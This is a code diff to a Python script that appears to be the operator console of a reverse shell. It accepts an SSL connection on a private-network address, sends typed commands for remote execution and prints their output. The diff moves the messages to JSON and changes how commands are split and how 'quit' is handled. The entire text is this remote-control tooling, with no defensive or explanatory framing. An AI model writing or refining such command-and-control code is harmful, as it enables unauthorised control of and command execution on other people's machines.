@@ -2,6 +2,7 @@
 
 import socket
 import ssl
+import json
 
 HOST = "10.0.2.7"
 PORT = 6666
@@ -24,15 +25,16 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             data += part
             if len(part) < 1024:
                 break
-        return data
+        return json.loads(data)
 
 
     def send(data):
-        conn.send(data.encode())
+        json_data = json.dumps(data)
+        conn.send(json_data.encode())
 
     def command_execution(command):
         send(command)
-        if command == "quit":
+        if command[0] == "quit":
             wrapS.close()
             print("[+] Connection closed")
             exit()
@@ -40,8 +42,9 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 
     while True:
         command = input(">> ")
+        command = command.split(" ")
         try:
             data = command_execution(command)
         except Exception:
             data = "[+] Error".encode()
-        print(data.decode("utf-8", "ignore"))
+        print(data)
